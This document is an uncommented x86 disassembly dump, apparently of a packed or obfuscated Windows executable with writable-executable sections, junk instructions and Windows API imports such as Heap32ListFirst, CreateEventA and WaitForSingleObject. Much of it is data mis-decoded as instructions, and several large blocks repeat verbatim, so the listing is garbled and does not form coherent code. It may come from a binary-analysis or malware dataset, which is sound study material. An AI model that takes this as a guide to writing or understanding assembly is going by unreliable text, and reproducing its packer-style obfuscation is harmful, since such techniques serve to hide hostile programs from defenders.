add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515dbe
mov [ esp ] bx
mov [ esp ] dl
dec al
push [ esp + 0x8 ]
bt bp 0xd
clc
ror al 0x6
clc
cmc
shr eax 0x1
push [ esp ]
push ecx
lea esp [ esp + 0x40 ]
je rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
pushad
adc ecx ecx
pushad
lea esp [ esp + 0x40 ]
je rwxdata
jns rwxdata
jmp rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
jmp rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_515e0b
pushf
pop [ esp + 0xa ]
rol dl cl
stc
mov dl [ esi ]
cmc
clc
cmc
not dl
mov [ esp + 0x4 ] bh
call sub_5157a0
add [ eax ] al
inc edi
je rwxdata
sub al 0xfe
movsd [ edi ] [ esi ]
push ebp
xchg [ esp + 0x2c ] esi
rcr si cl
lea esi [ edx * 8 + 0x4ed54e51 ]
bt bp 0xc
xor esi edx
mov esi edi
stc
stc
clc
jmp rwxdata
jb rwxdata
sub esi eax
pushfd
jmp rwxdata
cli
imul ebp [ edi + 0x6e ] 0xe35de400
ja rwxdata
jmp rwxdata
push esi
insd
int3
pushfd
[ edi ] [ esi ]
jmp rwxdata
movsx si dl
bswap si
mov [ esp + 0x4 ] sp
mov esi [ esp + 0x34 ]
pushfd
mov [ esp ] al
lea esp [ esp + 0x3c ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
